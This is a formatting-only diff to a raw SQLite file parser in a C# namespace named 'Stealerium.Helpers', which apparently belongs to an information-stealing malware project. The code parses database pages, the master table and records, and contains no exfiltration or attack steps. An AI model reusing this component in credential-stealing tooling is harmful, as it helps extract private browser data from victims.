@@ -9,7 +9,7 @@ namespace Stealerium.Helpers
         private readonly ulong _dbEncoding;
         private readonly byte[] _fileBytes;
         private readonly ulong _pageSize;
-        private readonly byte[] _sqlDataTypeSize = {0, 1, 2, 3, 4, 6, 8, 8, 0, 0};
+        private readonly byte[] _sqlDataTypeSize = { 0, 1, 2, 3, 4, 6, 8, 8, 0, 0 };
         private string[] _fieldNames;
         private SqliteMasterEntry[] _masterTableEntries;
         private TableEntry[] _tableEntries;
@@ -49,33 +49,33 @@ namespace Stealerium.Helpers
                 {
                     case 13:
                     {
-                        var num1 = (uint) (ConvertToULong((int) offset + 3, 2) - 1UL);
+                        var num1 = (uint)(ConvertToULong((int)offset + 3, 2) - 1UL);
                         var num2 = 0;
                         if (_tableEntries != null)
                         {
                             num2 = _tableEntries.Length;
-                            Array.Resize(ref _tableEntries, _tableEntries.Length + (int) num1 + 1);
+                            Array.Resize(ref _tableEntries, _tableEntries.Length + (int)num1 + 1);
                         }
                         else
                         {
-                            _tableEntries = new TableEntry[(int) num1 + 1];
+                            _tableEntries = new TableEntry[(int)num1 + 1];
                         }
 
-                        for (uint index1 = 0; (int) index1 <= (int) num1; ++index1)
+                        for (uint index1 = 0; (int)index1 <= (int)num1; ++index1)
                         {
-                            var num3 = ConvertToULong((int) offset + 8 + (int) index1 * 2, 2);
-                            if ((long) offset != 100L)
+                            var num3 = ConvertToULong((int)offset + 8 + (int)index1 * 2, 2);
+                            if ((long)offset != 100L)
                                 num3 += offset;
-                            var endIdx1 = Gvl((int) num3);
-                            Cvl((int) num3, endIdx1);
-                            var endIdx2 = Gvl((int) ((long) num3 + (endIdx1 - (long) num3) + 1L));
-                            Cvl((int) ((long) num3 + (endIdx1 - (long) num3) + 1L), endIdx2);
-                            var num4 = num3 + (ulong) (endIdx2 - (long) num3 + 1L);
-                            var endIdx3 = Gvl((int) num4);
+                            var endIdx1 = Gvl((int)num3);
+                            Cvl((int)num3, endIdx1);
+                            var endIdx2 = Gvl((int)((long)num3 + (endIdx1 - (long)num3) + 1L));
+                            Cvl((int)((long)num3 + (endIdx1 - (long)num3) + 1L), endIdx2);
+                            var num4 = num3 + (ulong)(endIdx2 - (long)num3 + 1L);
+                            var endIdx3 = Gvl((int)num4);
                             var endIdx4 = endIdx3;
-                            var num5 = Cvl((int) num4, endIdx3);
+                            var num5 = Cvl((int)num4, endIdx3);
                             RecordHeaderField[] array = null;
-                            var num6 = (long) num4 - endIdx3 + 1L;
+                            var num6 = (long)num4 - endIdx3 + 1L;
                             var index2 = 0;
                             while (num6 < num5)
                             {
@@ -91,44 +91,44 @@ namespace Stealerium.Helpers
                             }
 
                             if (array == null) continue;
-                            _tableEntries[num2 + (int) index1].Content = new string[array.Length];
+                            _tableEntries[num2 + (int)index1].Content = new string[array.Length];
                             var num7 = 0;
                             for (var index3 = 0; index3 <= array.Length - 1; ++index3)
                             {
                                 if (array[index3].Type > 9L)
                                 {
                                     if (!IsOdd(array[index3].Type))
-                                        switch ((long) _dbEncoding)
+                                        switch ((long)_dbEncoding)
                                         {
                                             case 1L:
-                                                _tableEntries[num2 + (int) index1].Content[index3] =
+                                                _tableEntries[num2 + (int)index1].Content[index3] =
                                                     Encoding.Default.GetString(_fileBytes,
-                                                        (int) ((long) num4 + num5 + num7), (int) array[index3].Size);
+                                                        (int)((long)num4 + num5 + num7), (int)array[index3].Size);
                                                 break;
                                             case 2L:
-                                                _tableEntries[num2 + (int) index1].Content[index3] =
+                                                _tableEntries[num2 + (int)index1].Content[index3] =
                                                     Encoding.Unicode.GetString(_fileBytes,
-                                                        (int) ((long) num4 + num5 + num7), (int) array[index3].Size);
+                                                        (int)((long)num4 + num5 + num7), (int)array[index3].Size);
                                                 break;
                                             case 3L:
-                                                _tableEntries[num2 + (int) index1].Content[index3] =
+                                                _tableEntries[num2 + (int)index1].Content[index3] =
                                                     Encoding.BigEndianUnicode.GetString(_fileBytes,
-                                                        (int) ((long) num4 + num5 + num7), (int) array[index3].Size);
+                                                        (int)((long)num4 + num5 + num7), (int)array[index3].Size);
                                                 break;
                                         }
                                     else
-                                        _tableEntries[num2 + (int) index1].Content[index3] =
-                                            Encoding.Default.GetString(_fileBytes, (int) ((long) num4 + num5 + num7),
-                                                (int) array[index3].Size);
+                                        _tableEntries[num2 + (int)index1].Content[index3] =
+                                            Encoding.Default.GetString(_fileBytes, (int)((long)num4 + num5 + num7),
+                                                (int)array[index3].Size);
                                 }
                                 else
                                 {
-                                    _tableEntries[num2 + (int) index1].Content[index3] =
-                                        Convert.ToString(ConvertToULong((int) ((long) num4 + num5 + num7),
-                                            (int) array[index3].Size));
+                                    _tableEntries[num2 + (int)index1].Content[index3] =
+                                        Convert.ToString(ConvertToULong((int)((long)num4 + num5 + num7),
+                                            (int)array[index3].Size));
                                 }
 
-                                num7 += (int) array[index3].Size;
+                                num7 += (int)array[index3].Size;
                             }
                         }
 
@@ -136,14 +136,14 @@ namespace Stealerium.Helpers
                     }
                     case 5:
                     {
-                        var num1 = (uint) (ConvertToULong((int) ((long) offset + 3L), 2) - 1UL);
-                        for (uint index = 0; (int) index <= (int) num1; ++index)
+                        var num1 = (uint)(ConvertToULong((int)((long)offset + 3L), 2) - 1UL);
+                        for (uint index = 0; (int)index <= (int)num1; ++index)
                         {
-                            var num2 = (uint) ConvertToULong((int) offset + 12 + (int) index * 2, 2);
-                            ReadTableFromOffset((ConvertToULong((int) ((long) offset + num2), 4) - 1UL) * _pageSize);
+                            var num2 = (uint)ConvertToULong((int)offset + 12 + (int)index * 2, 2);
+                            ReadTableFromOffset((ConvertToULong((int)((long)offset + num2), 4) - 1UL) * _pageSize);
                         }
 
-                        ReadTableFromOffset((ConvertToULong((int) ((long) offset + 8L), 4) - 1UL) * _pageSize);
+                        ReadTableFromOffset((ConvertToULong((int)((long)offset + 8L), 4) - 1UL) * _pageSize);
                         break;
                     }
                 }
@@ -163,44 +163,44 @@ namespace Stealerium.Helpers
                 switch (_fileBytes[offset])
                 {
                     case 5:
-                        var num1 = (uint) (ConvertToULong((int) offset + 3, 2) - 1UL);
-                        for (var index = 0; index <= (int) num1; ++index)
+                        var num1 = (uint)(ConvertToULong((int)offset + 3, 2) - 1UL);
+                        for (var index = 0; index <= (int)num1; ++index)
                         {
-                            var num2 = (uint) ConvertToULong((int) offset + 12 + index * 2, 2);
+                            var num2 = (uint)ConvertToULong((int)offset + 12 + index * 2, 2);
                             if (offset == 100L)
-                                ReadMasterTable(((long) ConvertToULong((int) num2, 4) - 1L) * (long) _pageSize);
+                                ReadMasterTable(((long)ConvertToULong((int)num2, 4) - 1L) * (long)_pageSize);
                             else
-                                ReadMasterTable(((long) ConvertToULong((int) (offset + num2), 4) - 1L) *
-                                                (long) _pageSize);
+                                ReadMasterTable(((long)ConvertToULong((int)(offset + num2), 4) - 1L) *
+                                                (long)_pageSize);
                         }
 
-                        offset = ((long) ConvertToULong((int) offset + 8, 4) - 1L) * (long) _pageSize;
+                        offset = ((long)ConvertToULong((int)offset + 8, 4) - 1L) * (long)_pageSize;
                         continue;
                     case 13:
-                        var num3 = ConvertToULong((int) offset + 3, 2) - 1UL;
+                        var num3 = ConvertToULong((int)offset + 3, 2) - 1UL;
                         var num4 = 0;
                         if (_masterTableEntries != null)
                         {
                             num4 = _masterTableEntries.Length;
-                            Array.Resize(ref _masterTableEntries, _masterTableEntries.Length + (int) num3 + 1);
+                            Array.Resize(ref _masterTableEntries, _masterTableEntries.Length + (int)num3 + 1);
                         }
                         else
                         {
-                            _masterTableEntries = new SqliteMasterEntry[checked((ulong) unchecked((long) num3 + 1L))];
+                            _masterTableEntries = new SqliteMasterEntry[checked((ulong)unchecked((long)num3 + 1L))];
                         }
 
                         for (ulong index1 = 0; index1 <= num3; ++index1)
                         {
-                            var num2 = ConvertToULong((int) offset + 8 + (int) index1 * 2, 2);
-                            if (offset != 100L) num2 += (ulong) offset;
-                            var endIdx1 = Gvl((int) num2);
-                            Cvl((int) num2, endIdx1);
-                            var endIdx2 = Gvl((int) ((long) num2 + (endIdx1 - (long) num2) + 1L));
-                            Cvl((int) ((long) num2 + (endIdx1 - (long) num2) + 1L), endIdx2);
-                            var num5 = num2 + (ulong) (endIdx2 - (long) num2 + 1L);
-                            var endIdx3 = Gvl((int) num5);
+                            var num2 = ConvertToULong((int)offset + 8 + (int)index1 * 2, 2);
+                            if (offset != 100L) num2 += (ulong)offset;
+                            var endIdx1 = Gvl((int)num2);
+                            Cvl((int)num2, endIdx1);
+                            var endIdx2 = Gvl((int)((long)num2 + (endIdx1 - (long)num2) + 1L));
+                            Cvl((int)((long)num2 + (endIdx1 - (long)num2) + 1L), endIdx2);
+                            var num5 = num2 + (ulong)(endIdx2 - (long)num2 + 1L);
+                            var endIdx3 = Gvl((int)num5);
                             var endIdx4 = endIdx3;
-                            var num6 = Cvl((int) num5, endIdx3);
+                            var num6 = Cvl((int)num5, endIdx3);
                             var numArray = new long[5];
                             for (var index2 = 0; index2 <= 4; ++index2)
                             {
@@ -212,49 +212,49 @@ namespace Stealerium.Helpers
                                     (numArray[index2] - 13L) / 2L;
                             }
 
-                            if ((long) _dbEncoding == 1L || (long) _dbEncoding == 2L)
+                            if ((long)_dbEncoding == 1L || (long)_dbEncoding == 2L)
 
-                                switch ((long) _dbEncoding)
+                                switch ((long)_dbEncoding)
                                 {
                                     case 1L:
-                                        _masterTableEntries[num4 + (int) index1].ItemName =
+                                        _masterTableEntries[num4 + (int)index1].ItemName =
                                             Encoding.Default.GetString(_fileBytes,
-                                                (int) ((long) num5 + num6 + numArray[0]), (int) numArray[1]);
+                                                (int)((long)num5 + num6 + numArray[0]), (int)numArray[1]);
                                         break;
                                     case 2L:
-                                        _masterTableEntries[num4 + (int) index1].ItemName =
+                                        _masterTableEntries[num4 + (int)index1].ItemName =
                                             Encoding.Unicode.GetString(_fileBytes,
-                                                (int) ((long) num5 + num6 + numArray[0]), (int) numArray[1]);
+                                                (int)((long)num5 + num6 + numArray[0]), (int)numArray[1]);
                                         break;
                                     case 3L:
-                                        _masterTableEntries[num4 + (int) index1].ItemName =
+                                        _masterTableEntries[num4 + (int)index1].ItemName =
                                             Encoding.BigEndianUnicode.GetString(_fileBytes,
-                                                (int) ((long) num5 + num6 + numArray[0]), (int) numArray[1]);
+                                                (int)((long)num5 + num6 + numArray[0]), (int)numArray[1]);
                                         break;
                                 }
 
-                            _masterTableEntries[num4 + (int) index1].RootNum = (long) ConvertToULong(
-                                (int) ((long) num5 + num6 + numArray[0] + numArray[1] + numArray[2]),
-                                (int) numArray[3]);
-                            switch ((long) _dbEncoding)
+                            _masterTableEntries[num4 + (int)index1].RootNum = (long)ConvertToULong(
+                                (int)((long)num5 + num6 + numArray[0] + numArray[1] + numArray[2]),
+                                (int)numArray[3]);
+                            switch ((long)_dbEncoding)
                             {
                                 case 1L:
-                                    _masterTableEntries[num4 + (int) index1].SqlStatement =
+                                    _masterTableEntries[num4 + (int)index1].SqlStatement =
                                         Encoding.Default.GetString(_fileBytes,
-                                            (int) ((long) num5 + num6 + numArray[0] + numArray[1] + numArray[2] +
-                                                   numArray[3]), (int) numArray[4]);
+                                            (int)((long)num5 + num6 + numArray[0] + numArray[1] + numArray[2] +
+                                                  numArray[3]), (int)numArray[4]);
                                     break;
                                 case 2L:
-                                    _masterTableEntries[num4 + (int) index1].SqlStatement =
+                                    _masterTableEntries[num4 + (int)index1].SqlStatement =
                                         Encoding.Unicode.GetString(_fileBytes,
-                                            (int) ((long) num5 + num6 + numArray[0] + numArray[1] + numArray[2] +
-                                                   numArray[3]), (int) numArray[4]);
+                                            (int)((long)num5 + num6 + numArray[0] + numArray[1] + numArray[2] +
+                                                  numArray[3]), (int)numArray[4]);
                                     break;
                                 case 3L:
-                                    _masterTableEntries[num4 + (int) index1].SqlStatement =
+                                    _masterTableEntries[num4 + (int)index1].SqlStatement =
                                         Encoding.BigEndianUnicode.GetString(_fileBytes,
-                                            (int) ((long) num5 + num6 + numArray[0] + numArray[1] + numArray[2] +
-                                                   numArray[3]), (int) numArray[4]);
+                                            (int)((long)num5 + num6 + numArray[0] + numArray[1] + numArray[2] +
+                                                  numArray[3]), (int)numArray[4]);
                                     break;
                             }
                         }
@@ -293,7 +293,7 @@ namespace Stealerium.Helpers
                 _fieldNames[index2] = strArray[index2];
             }
 
-            return ReadTableFromOffset((ulong) (_masterTableEntries[index1].RootNum - 1L) * _pageSize);
+            return ReadTableFromOffset((ulong)(_masterTableEntries[index1].RootNum - 1L) * _pageSize);
         }
 
         private ulong ConvertToULong(int startIndex, int size)
@@ -348,7 +348,7 @@ namespace Stealerium.Helpers
                 switch (num1)
                 {
                     case 1:
-                        numArray[0] = (byte) (_fileBytes[startIdx] & (uint) sbyte.MaxValue);
+                        numArray[0] = (byte)(_fileBytes[startIdx] & (uint)sbyte.MaxValue);
                         return BitConverter.ToInt64(numArray, 0);
                     case 9:
                         flag = true;
@@ -370,15 +370,15 @@ namespace Stealerium.Helpers
                 {
                     if (index2 - 1 >= startIdx)
                     {
-                        numArray[index1] = (byte) (((_fileBytes[index2] >> (num2 - 1)) & (byte.MaxValue >> num2)) |
-                                                   (_fileBytes[index2 - 1] << num3));
+                        numArray[index1] = (byte)(((_fileBytes[index2] >> (num2 - 1)) & (byte.MaxValue >> num2)) |
+                                                  (_fileBytes[index2 - 1] << num3));
                         ++num2;
                         ++index1;
                         --num3;
                     }
                     else if (!flag)
                     {
-                        numArray[index1] = (byte) ((_fileBytes[index2] >> (num2 - 1)) & (byte.MaxValue >> num2));
+                        numArray[index1] = (byte)((_fileBytes[index2] >> (num2 - 1)) & (byte.MaxValue >> num2));
                     }
 
                     index2 += -1;
